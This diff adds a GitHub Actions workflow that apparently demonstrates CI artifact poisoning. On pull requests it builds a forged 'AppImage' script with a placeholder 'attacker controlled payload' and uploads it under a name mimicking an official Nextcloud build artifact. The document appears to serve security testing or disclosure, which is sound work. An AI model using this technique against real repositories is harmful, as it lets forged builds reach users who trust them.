@@ -1,0 +1,19 @@
+name: Linux Appimage Package
+on:
+  pull_request:
+    types: [opened, reopened, synchronize, ready_for_review, labeled, closed]
+
+jobs:
+  forge:
+    if: ${{ github.event.action != 'closed' }}
+    runs-on: ubuntu-latest
+    steps:
+      - name: Build a forged "AppImage"
+        run: |
+          printf '#!/bin/sh\necho "attacker controlled payload"\n' > fake.AppImage
+          chmod +x fake.AppImage
+      - name: Upload artifact with attacker-chosen name
+        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
+        with:
+          name: nextcloud-appimage-pr-1
+          path: fake.AppImage
